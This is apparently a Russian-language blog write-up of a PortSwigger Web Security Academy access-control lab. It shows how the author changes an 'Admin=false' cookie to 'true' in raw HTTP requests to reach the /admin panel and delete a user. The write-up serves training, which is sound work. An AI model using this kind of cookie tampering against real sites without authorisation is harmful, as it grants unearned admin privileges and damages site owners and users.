---
title: "User role controlled by request parameter"
date: 2025-07-17
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/access-control-apprentice/access-control/lab-user-role-controlled-by-request-parameter#"
classes: wide
---

В данной лабе есть админ панель в поддиректории `/admin`. Для прохождения нужно удалить пользователя `carlos`. У нас есть свой аккаунт с кредами `wiener:peter`.

```
https://0a7400940427e73e81239e93008800d6.web-security-academy.net/
```

## Solution

Так как у нас креды, было бы глупо не войти в наш аккаунт.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_User_role_controlled_by_request_parameter/1.png){: height="200" .align-center}

В `url` нашего профиля `https://0a7400940427e73e81239e93008800d6.web-security-academy.net/my-account?id=wiener` мы можем увидеть `GET`-параметр `my-account`.

Можно попробовать указать другое имя аккаунта. Например, `carlos`. И это не сработало :(

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_User_role_controlled_by_request_parameter/2.png){: height="200" .align-center}

Можно посмотреть `HTTP`-запрос, который мы отправляем для получения страницы:

```http
GET /my-account HTTP/2
Host: 0a7400940427e73e81239e93008800d6.web-security-academy.net
Cookie: session=Vy6WXmcR6UmR0et3TlDj5mwYWF2Xy5f4; Admin=false
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a7400940427e73e81239e93008800d6.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
Te: trailers
```

Мы можем увидеть, что в запросе нам установилось `Cookie`: `Admin` со значением `false`. Конечно же поменяем его на `True`.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_User_role_controlled_by_request_parameter/3.png){: height="200" .align-center}

Попробуем таким же образом зайти в панель администратора:

```http
GET /admin HTTP/2
Host: 0a7400940427e73e81239e93008800d6.web-security-academy.net
Cookie: session=eRLogJbzgvCOwyqgzja8CRmzduJ8L2Dl; Admin=true
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
Te: trailers
```

Успех) Теперь просто удалим пользователя.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_User_role_controlled_by_request_parameter/4.png){: height="200" .align-center}